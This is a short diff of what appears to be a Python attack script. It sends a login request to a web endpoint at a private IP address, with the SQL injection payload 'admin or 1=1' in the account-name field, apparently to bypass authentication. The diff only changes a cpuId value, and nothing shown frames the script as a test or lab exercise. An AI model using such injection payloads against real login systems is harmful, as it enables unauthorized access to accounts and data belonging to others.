@@ -20,7 +20,7 @@ def run():
 		"accountName": "admin or 1=1",
 		"accountPwd": "",
 		"mac": "",
-		"cpuId": "1"
+		"cpuId": "nwww"
 	}
 }
     url= 'http://192.168.1.222/v2/jjr_user_login/pc_login_new'
